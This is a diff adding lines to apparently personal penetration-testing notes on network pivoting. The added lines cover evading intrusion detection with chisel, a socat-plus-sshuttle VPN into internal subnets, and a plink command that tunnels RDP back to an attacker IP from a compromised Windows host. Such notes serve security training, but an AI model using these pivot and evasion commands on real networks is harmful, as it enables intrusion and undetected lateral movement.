@@ -5,6 +5,10 @@
 https://cheatsheet.haax.fr/network/pivot_techniques/
 https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
 
+## Note about chisel
+
+chisel performs HTTP tunneling thus aboiding most IDS. Use encryption for better efficiency.
+
 ## Persist
 
 It is important to establish persistence before moving forward with actions on objectives.
@@ -160,4 +164,24 @@ It can be tricky to use burp with socks but here is a good workaround
 `grep '/open/' 10.42.42.2 | uniq > openports.log`
 
 * then scan each port separately
+
+## Transparent VPN over ssh
+
+* setup port forward to ssh server: `socat TCP-LISTEN:2222, fork TCP:10.11.222.3:22`
+* use sshuttle (requires root privleges): sets up VPN and tunnels mentioned subnets
+
+```bash
+
+sshuttle -r root@127.0.0.1:2222 10.4.22.0/24 192.168.1.0/24
+
+# now routing is setup on localhost to reach mentioned subnets
+```
+
+## SSH On windows with plink
+
+use plink to tunnel once reverse shell on windows is obtained
+
+`plink.exe -ssh -l kali -pw Password -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.203`
+
+## DNS tunneling
 
